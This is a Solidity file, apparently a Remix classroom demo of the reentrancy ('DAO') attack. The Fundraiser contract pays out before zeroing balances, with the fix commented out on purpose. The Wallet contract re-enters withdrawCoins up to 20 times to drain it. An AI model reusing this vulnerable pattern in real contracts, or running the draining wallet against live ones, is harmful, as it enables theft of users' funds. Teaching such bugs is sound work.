pragma solidity ^0.5.16;

// https://remix.ethereum.org/

contract Fundraiser {
    mapping(address => uint256) balances;
    uint256 withdrawAmount;

    constructor() public {
        withdrawAmount = 0;
    }

    function withdrawCoins() public {
        withdrawAmount = balances[msg.sender];
        // balances[msg.sender] = 0; // Prevent DAO attact
        Wallet wallet = Wallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        balances[msg.sender] = 0; // DAO attack
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getBalanceOfSender() public view returns (uint256) {
        return balances[msg.sender];
    }

    function getWithdrawAmount() public view returns (uint256) {
        return withdrawAmount;
    }

    function contribute() public payable {
        balances[msg.sender] += msg.value;
    }

    function() external payable {}
}

contract Wallet {
    Fundraiser fundraiser;
    uint256 recursion = 20;

    constructor(address payable fundraiserAddress) public {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint256 amount) public {
        fundraiser.contribute.value(amount)();
    }

    function withdraw() public {
        fundraiser.withdrawCoins();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function payout() public payable {
        if (recursion > 0) {
            recursion--;
            fundraiser.withdrawCoins();
        }
    }

    function() external payable {}
}
